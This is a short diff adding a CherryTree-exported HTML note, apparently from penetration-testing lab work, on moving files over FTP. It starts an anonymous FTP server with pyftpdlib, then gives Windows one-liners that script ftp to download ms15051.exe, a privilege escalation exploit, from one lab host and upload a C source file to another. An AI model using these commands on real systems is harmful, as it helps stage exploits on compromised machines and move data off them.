@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>FTP FIle Movment</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>FTP FIle Movment</h1><br/>python3 -m pip install pyftpdlib<br /><br />python3 -m pyftpdlib -p 21<br /><br /><br /><br />echo open 10.10.14.60&gt;ftp_commands.txt&amp;echo anonymous&gt;&gt;ftp_commands.txt&amp;echo password&gt;&gt;ftp_commands.txt&amp;echo binary&gt;&gt;ftp_commands.txt&amp;echo get ms15051.exe&gt;&gt;ftp_commands.txt&amp;echo bye&gt;&gt;ftp_commands.txt&amp;ftp -s:ftp_commands.txt<br /><br />echo open 10.9.0.59&gt;ftp_commands.txt&amp;echo anonymous&gt;&gt;ftp_commands.txt&amp;echo password&gt;&gt;ftp_commands.txt&amp;echo binary&gt;&gt;ftp_commands.txt&amp;echo put windows_dll.c&gt;&gt;ftp_commands.txt&amp;echo bye&gt;&gt;ftp_commands.txt&amp;ftp -s:ftp_commands.txt</div></body></html>
